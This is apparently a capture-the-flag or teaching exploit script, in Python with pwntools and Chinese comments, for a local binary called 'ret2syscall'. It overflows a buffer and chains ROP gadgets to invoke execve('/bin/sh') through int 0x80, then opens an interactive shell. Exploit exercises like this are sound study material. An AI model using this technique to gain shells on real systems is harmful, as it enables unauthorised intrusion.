##coding=utf8
from pwn import *
## 构造与程序交互的对象

def main():

    sh = process('./ret2syscall')

    pop_eax_ret_addr = 0x080bb196
    pop_edx_ecx_ebx_ret_addr = 0x0806eb90
    int_80_addr = 0x08049421
    bin_sh_addr = 0x080be408

    sys_call_id = 0xb
    edx_val = 0
    ecx_val = 0
    ebx_val = bin_sh_addr
    
    offset = 0x6c + 4

    ## 构造payload
    payload = 'A' * offset + \
        p32(pop_eax_ret_addr).decode('unicode_escape') + \
            p32(sys_call_id).decode('unicode_escape') + \
        p32(pop_edx_ecx_ebx_ret_addr).decode('unicode_escape') + \
            p32(edx_val).decode('unicode_escape') + \
            p32(ecx_val).decode('unicode_escape') + \
            p32(ebx_val).decode('unicode_escape') + \
            p32(int_80_addr).decode('unicode_escape')

    ## 向程序发送字符串
    sh.sendline(payload)


    sh.interactive()

if __name__ == "__main__":
    main()